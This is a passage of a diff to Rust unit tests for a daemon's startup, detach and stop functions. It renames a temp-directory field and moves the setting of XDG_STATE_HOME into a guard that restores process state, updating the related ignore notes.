-        let sock = tmp.0.join("daemon.sock");
+        let sock = tmp.path.join("daemon.sock");
 
         // `true` exits 0 immediately; wait for it so the first `try_wait()` in
         // `poll_startup` observes the exit deterministically.
@@ -1894,8 +1947,8 @@ mod tests {
     #[test]
     fn poll_startup_times_out_when_no_socket() {
         let tmp = TmpDir::new("poll-timeout");
-        std::fs::create_dir_all(&tmp.0).expect("dir");
-        let sock = tmp.0.join("daemon.sock"); // never created
+        std::fs::create_dir_all(&tmp.path).expect("dir");
+        let sock = tmp.path.join("daemon.sock"); // never created
 
         let mut live = LiveChild::sleeping();
         let outcome = super::poll_startup(
@@ -1914,17 +1967,15 @@ mod tests {
     /// the daemon is reachable (`status()` pings it successfully), then `stop()`
     /// tears it down.
     ///
-    /// `#[ignore]` because it points process-global `XDG_STATE_HOME` at a temp
-    /// dir (so the detached child resolves an isolated runtime dir) and actually
-    /// binds a socket — mutating that env races the other parallel env-reading
-    /// tests in this binary. Run with `--ignored` in isolation.
+    /// `#[ignore]` because it spawns a real detached daemon and binds a socket;
+    /// the shared guard still isolates and exactly restores its process state.
     #[cfg(unix)]
     #[test]
-    #[ignore = "mutates process-global XDG_STATE_HOME and binds a real socket; run with --ignored in isolation"]
+    #[ignore = "spawns a detached daemon and binds a real socket"]
     fn start_detach_spawns_verifies_and_stops() {
-        let tmp = TmpDir::new("detach-e2e");
-        std::fs::create_dir_all(&tmp.0).expect("create state dir");
-        std::env::set_var("XDG_STATE_HOME", &tmp.0);
+        let mut tmp = TmpDir::new("detach-e2e");
+        std::fs::create_dir_all(&tmp.path).expect("create state dir");
+        tmp.global.set_env("XDG_STATE_HOME", &tmp.path);
 
         // Ensure a clean slate (no leftover pid/sock from a prior run).
         let _ = super::stop();
@@ -1941,8 +1992,6 @@ mod tests {
         assert_eq!(super::status(), 0, "daemon must be reachable via ping");
 
         assert_eq!(super::stop(), 0, "stop() must shut the daemon down");
-
-        std::env::remove_var("XDG_STATE_HOME");
     }
 
     /// The detach path honors the pre-spawn already-running guard: once a daemon
@@ -1950,16 +1999,15 @@ mod tests {
     /// foreground path) instead of mistaking the live socket for a freshly bound
     /// child and reporting `0`.
     ///
-    /// `#[ignore]` for the same reason as the end-to-end test above: it points
-    /// process-global `XDG_STATE_HOME` at a temp dir and binds a real socket,
-    /// which races the other parallel env-reading tests. Run with `--ignored`.
+    /// `#[ignore]` for the same reason as the end-to-end test above: it spawns
+    /// a real detached daemon and binds a socket.
     #[cfg(unix)]
     #[test]
-    #[ignore = "mutates process-global XDG_STATE_HOME and binds a real socket; run with --ignored in isolation"]
+    #[ignore = "spawns a detached daemon and binds a real socket"]
     fn start_detach_short_circuits_when_already_running() {
-        let tmp = TmpDir::new("detach-already-running");
-        std::fs::create_dir_all(&tmp.0).expect("create state dir");
-        std::env::set_var("XDG_STATE_HOME", &tmp.0);
+        let mut tmp = TmpDir::new("detach-already-running");
+        std::fs::create_dir_all(&tmp.path).expect("create state dir");
+        tmp.global.set_env("XDG_STATE_HOME", &tmp.path);
 
         // Clean slate, then bring a daemon up so the socket + PID file exist.
         let _ = super::stop();
@@ -1974,7 +2022,5 @@ mod tests {
         );
 
         assert_eq!(super::stop(), 0, "stop() must shut the daemon down");
-
-        std::env::remove_var("XDG_STATE_HOME");
     }
 }
